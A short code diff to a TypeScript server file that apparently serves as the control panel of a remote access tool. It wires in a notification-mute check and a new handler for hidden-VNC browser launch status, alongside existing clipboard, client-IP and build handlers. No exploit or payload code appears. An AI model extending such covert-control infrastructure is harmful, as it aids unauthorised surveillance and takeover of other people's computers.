@@ -5,7 +5,7 @@ import { fileURLToPath } from "url";
 import path from "path";
 import fs from "fs/promises";
 import { existsSync } from "node:fs";
-import { upsertClientRow, setOnlineState, listClients, markAllClientsOffline, getBuild, getAllBuilds, deleteExpiredBuilds, deleteBuild, getNotificationScreenshot, deleteClientRow, getClientIp, banIp, isIpBanned, clientExists, deleteExpiredSharedFiles, getChatHistory, insertChatMessage, getOnlineClientCountForUser, deleteExpiredChatMessages, recordBuildClaim, getClientMetricsSummary, pruneOldNotifications } from "./db";
+import { upsertClientRow, setOnlineState, listClients, markAllClientsOffline, getBuild, getAllBuilds, deleteExpiredBuilds, deleteBuild, getNotificationScreenshot, deleteClientRow, getClientIp, banIp, isIpBanned, clientExists, deleteExpiredSharedFiles, getChatHistory, insertChatMessage, getOnlineClientCountForUser, deleteExpiredChatMessages, recordBuildClaim, getClientMetricsSummary, pruneOldNotifications, isClientNotificationsMuted } from "./db";
 import { handleFrame, handleHello, handlePing, handlePong } from "./wsHandlers";
 import { getMessageByteLength, getMaxPayloadLimit, isAllowedClientMessageType } from "./wsValidation";
 import { ClientInfo, ClientRole } from "./types";
@@ -95,6 +95,7 @@ import {
   handleHVNCBrowserCheckResult,
   handleHVNCInstalledAppsResult,
   handleHVNCDXGIStatus,
+  handleHVNCBrowserLaunchStatus,
   handleClipboardContent,
   handleWebrtcP2PAnswer,
   handleWebrtcP2PIce,
@@ -339,6 +340,7 @@ const notificationPluginHandlers = createNotificationPluginHandlers({
   getNotificationConfig,
   canUserAccessClient: canUserAccessClient as (userId: number, userRole: string, clientId: string) => boolean,
   getUserRole: (userId: number) => getUserById(userId)?.role,
+  isClientNotificationsMuted,
   storeNotificationScreenshot: storeNotificationScreenshotForPending,
   deliverNotificationWithScreenshot: deliverNotificationWithScreenshotForRecord,
   forwardPluginEventToRuntime: (clientId, pluginId, event, payload) =>
@@ -677,6 +679,7 @@ async function startServer() {
     handleHVNCBrowserCheckResult,
     handleHVNCInstalledAppsResult,
     handleHVNCDXGIStatus,
+    handleHVNCBrowserLaunchStatus,
     handleClipboardContent,
     handleWebrtcP2PAnswer,
     handleWebrtcP2PIce,
